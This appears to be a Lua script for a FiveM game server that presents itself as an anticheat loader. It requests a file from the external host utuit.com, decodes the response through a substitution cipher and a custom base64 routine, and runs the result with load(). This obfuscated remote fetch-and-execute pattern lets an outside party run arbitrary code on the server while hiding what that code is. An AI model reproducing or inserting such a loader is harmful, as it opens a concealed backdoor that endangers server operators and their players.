oldprint = print

local File = {}

local bString='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local delimiter='&#ADwe468861#/|8448wewefs8723B@1SertFY|'
local timestamp = os.time(os.date("!*t")) * 2
local ramstart = math.random(356912547884, 985674123684)
local ramend = math.random(584632214789125, 748895547852741)
local finalrandom = ramstart..timestamp..ramend
local decrypted = ""

local dec = function(data)
    data = string.gsub(data, '[^'..bString..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(bString:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

local decrypt = function(encoTypo, disaster)
    for i = 1, #encoTypo do
        local c = string.sub(encoTypo, i, i)
        decrypted = decrypted .. disaster[c]
    end
end

local mountDecryptTable = function(data) 
    local returnTable = {}

    local first = true

    for i = 1, #data do
        if first then
            local s = string.sub(data, i, i)
            local nextId = i + 1
            local next = string.sub(data, nextId, nextId)

            returnTable[s] = next
            first = false
        else
            first = true
        end
    end

    return returnTable
end

File.Id = "ZxhQuibIJt-m9fLxeJjoI"

File.GetFile = function()
    PerformHttpRequest("https://utuit.com/file/".. File.Id, File.ResFile, "GET", "{}", {s=finalrandom})
end

File.ResFile = function(g,h,i)
    if g == 200 then
            local totalLength = string.len(h)
            local st, en = string.find(h, delimiter)

            local content = string.sub(h, en + 1, totalLength)
            local decryptOptions = string.sub(h, 1, st -1)
            local decryptTool = mountDecryptTable(decryptOptions)

            Citizen.CreateThread(function()
                decrypt(content, decryptTool)
                local file = dec(decrypted)

                assert(load(file))()
            end)
    else
        oldprint(g)
        oldprint("No se pudo conectar con el AC, contacta con: CarlosLR#0001")
    end
end
File.GetFile()